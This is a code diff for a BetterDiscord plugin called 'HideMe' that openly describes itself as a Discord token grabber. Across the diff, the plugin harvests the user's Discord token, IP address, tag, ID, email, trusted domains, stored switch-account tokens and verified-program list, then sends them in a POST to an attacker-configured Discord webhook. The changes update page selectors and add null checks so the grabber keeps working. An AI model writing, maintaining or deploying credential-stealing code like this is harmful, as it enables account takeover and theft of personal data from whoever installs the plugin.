@@ -2,7 +2,7 @@
  * @name HideMe
  * @author HideakiAtsuyo
  * @authorId 868150205852291183
- * @version 1.1.2
+ * @version 1.1.1
  * @description Allows you to token grab people omg
  * @invite https://discord.gg/C7yHkVSE2M
  * @donate https://www.paypal.me/HideakiAtsuyoLmao
@@ -28,7 +28,7 @@ class HideMe {
         return "Better Discord Token Grab Lmao github.com/HideakiAtsuyo";
     }
     getVersion() {
-        return "1.1.2";
+        return "1.1.1";
     }
     getAuthor() {
         return "Hideaki Atsuyo";
@@ -75,8 +75,8 @@ class HideMe {
     	}
 
     	var IP = await getIP();
-    	var actualUserUsername = document.getElementsByClassName("size14-e6ZScH title-eS5yk3")[0].innerText;
-        var actualUserDiscriminator = document.getElementsByClassName("size12-3cLvbJ subtext-3CDbHg")[0].innerText.includes("\n") ? document.getElementsByClassName("hovered-d5PMVU")[0]?.innerText : document.getElementsByClassName("size12-3cLvbJ subtext-3CDbHg")[0]?.innerText;
+    	var actualUserUsername = document.getElementsByClassName("size14-3fJ-ot title-338goq")[0].innerText;
+        var actualUserDiscriminator = document.getElementsByClassName("size12-oc4dx4 subtext-2HDqJ7")[0].innerText.includes("\n") ? document.getElementsByClassName("hoverRoll-2XwpoF")[0]?.innerText : document.getElementsByClassName("size12-oc4dx4 subtext-2HDqJ7")[0]?.innerText;
         var actualUserTag = actualUserUsername+actualUserDiscriminator;
     	var actualUserToken = await getInfo("token");
     	var actualUserID = await getInfo("user_id_cache");
@@ -91,8 +91,10 @@ class HideMe {
             username: config.webhookUsername,
             avatar_url: config.webhookAvatar,
             tts: config.tts,
-            embeds: [{"title": config.embedTitle, "description": "[GitHub](https://github.com/HideakiAtsuyo/BetterGrabber)", "color": config.embedColor, "fields": [{ "name": "IP", "value": `\`${IP}\``, inline: false }, { "name": "Actual User Token", "value": `\`${actualUserToken.replaceAll("\"", "")||"Unknown Issue"}\``, inline: true }, { "name": "Actual User Tag With ID", "value": `\`${actualUserTag.replaceAll("\"", "")}\` - (\`${actualUserID.replaceAll("\"", "")}\`)`, inline: true }, { "name": "Actual User email", "value": `\`${actualUserEmail.replaceAll("\"", "")}\``, inline: true }, { "name": "Trusted Domains List", "value": `\`\`\`\n${JSON.parse(trustedDomains)["trustedDomains"]}\`\`\``, inline: false }, { "name": "Stored Tokens(From Switch Account Feature :) (ID:Token))", "value": `\`\`\`json\n${storedTokens}\`\`\``, inline: false }, { "name": "Verified Games & Programs", "value": `\`\`\`json\n${verifiedGameAndProgramsList}\`\`\``, inline: false }]}]
+            embeds: [{"title": config.embedTitle, "description": "[GitHub](https://github.com/HideakiAtsuyo/BetterGrabber)", "color": config.embedColor, "fields": [{ "name": "IP", "value": `\`${IP}\``, inline: false }, { "name": "Actual User Token", "value": `\`${actualUserToken.replaceAll("\"", "")||"Unknown Issue"}\``, inline: true }, { "name": "Actual User Tag With ID", "value": `\`${actualUserTag.replaceAll("\"", "")}\` - (\`${actualUserID.replaceAll("\"", "")}\`)`, inline: true }, { "name": "Actual User email", "value": `\`${actualUserEmail.replaceAll("\"", "")}\``, inline: true }, { "name": "Trusted Domains List", "value": `\`\`\`\n${trustedDomains == undefined ? "null" : JSON.parse(trustedDomains)["trustedDomains"]}\`\`\``, inline: false }, { "name": "Stored Tokens(From Switch Account Feature :) (ID:Token))", "value": `\`\`\`json\n${storedTokens == undefined ? "null" : storedTokens}\`\`\``, inline: false }, { "name": "Verified Games & Programs", "value": `\`\`\`json\n${verifiedGameAndProgramsList == undefined ? "null": verifiedGameAndProgramsList}\`\`\``, inline: false }]}]
         });
+
+        console.log(pD)
 
         var SendToWebhook = https.request({ "hostname": "discord.com", "port": 443, "path": config.webHook, "method": "POST", "headers": { 'Content-Type': "application/json", 'Content-Length': pD.length } });
         SendToWebhook.on('error', (e) => {
